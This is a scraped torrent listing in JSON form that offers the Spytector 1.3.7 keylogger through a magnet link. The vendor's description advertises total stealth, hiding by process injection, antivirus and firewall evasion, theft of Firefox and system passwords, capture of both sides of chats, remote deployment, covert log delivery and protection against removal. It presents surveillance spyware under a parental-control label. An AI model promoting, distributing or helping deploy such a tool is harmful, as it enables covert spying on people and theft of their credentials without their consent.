{"title":"Spytector 1.3.7","uid":6138758,"size":1354271,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:8c5e7ff26088c8cf71bec9f81e90fad1d5961374&amp;dn=Spytector+1.3.7&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":2,"leechers":0,"uploader":"i.love.you.TPB","files":2,"time":1296413233,"description":"Spytector 1.3.7 - the new version of the award-winning keylogger (parental control software) is available for download.\nSpytector is the ultimate invisible and undetectable keylogger (spy) software that completely satisfies your PC monitoring and surveillance needs. Spytector server is running in total stealth, undetectable even for advanced users, perfect for monitoring the way your PC is used. The trial version of Spytector is detected by few antivirus applications, even if it's not a trojan or a hacking tool. Spytector is a commercial legitimate keylogger and our customers must be able to use Spytector on their computers in the same time with other security applications, so the version they receive (the full version) will be undetected when scanned with all the well known antivirus products.\nOur powerful and professional key logger can be used by home and corporate users. All the PC activity is stored in secured encrypted log files. The logs are received either by email or FTP (the log sending procedure is invisible and undetectable for many local firewalls) and afterwards they can be converted in eye catching reports by the in-built Log Viewer. The full colored logs can be saved as RTF or HTML files.\n\nSpytector keylogger is completely stealth on the user's desktop and cannot be seen in the Task Manager, being injected into system processes. The current version of Spytector is compatible with Windows NT4/2k/XP/VISTA (32bit and 64bit)/Windows 7 (32bit and 64bit). In the case you have a different operating system (Windows 98/ME), you can use an older version of Spytector.\n\n\nMonitoring features \t\n# keystrokes\n# websites\n# both sides of chat (AIM, ICQ, Yahoo Messenger, MSN Messenger)\n# applications\n# keylogger filter (only specific websites/windows are tracked)\n# clipboard monitoring\n# boot events\n# passwords\n\t\n\n\tMain application features \t\n# built-in log viewer utility\n# option to save the settings\n# the logs can be saved as RTF and HTML files\n# multi-language interface\n# editable keylogger server name, log name, log size, startup key name\n# all the mentioned server features are editable from the main application\n# local logfile retrieving\n# skinnable interface\n\tServer features \t\n# FTP and Email log delivery\n# remotely deployable\n# option to include Protected Storage passwords in the log (NT, 2k, XP)\n# option to include FireFox passwords in the log\n# option to include URL history in the log\n# the logs can be received either when they reached a minimum size or at specified day intervals\n# the keylogger works on Windows NT4, 2000, XP, 2003, VISTA, Windows 7 (even on Guest account)\n# both small and large icons of the server can be changed\n# editable keylogger server name, log name, log size, startup key name\n# smart keylogger (BACKSPACE is applied)\n# melting option\n# warning message option\n# option to uninstall the keylogger server after a specifed number of sent logs\n# option to uninstall the keylogger server with a specified hotkey\n# option to uninstall the keylogger server by checking HTTP\n# delay (the server will be active after a specified time or after boot)\n\t\n\n\tSecurity features \t\n# totally invisible and undetectable keylogger server\n# advanced firewall bypass techniques (the keylogger is undetectable by many local firewalls)\n# stealth log delivery (using the default browser or default emailer)\n# local encrypted logfiles\n# optional encryption for delivered logs\n# encrypted keylogger server settings\n# keylogger server overwriting protection\n# password protected configuration\n# password protected uninstallation for the main application\n# keylogger server protection against uninstallation\n# the keylogger can disable the System Restore feature (2k, XP)\n# the keylogger can restrict the access to specified websites\n# the keylogger can restrict the access to specified applications\n\n\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nFound it on some site and decided to upload it on TPB. This is the newest version atm.","torrent":{"xt":"urn:btih:8c5e7ff26088c8cf71bec9f81e90fad1d5961374","amp;dn":"Spytector+1.3.7","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"8c5e7ff26088c8cf71bec9f81e90fad1d5961374","infoHashBuffer":{"type":"Buffer","data":[140,94,127,242,96,136,200,207,113,190,201,248,30,144,250,209,213,150,19,116]},"announce":[],"urlList":[]}}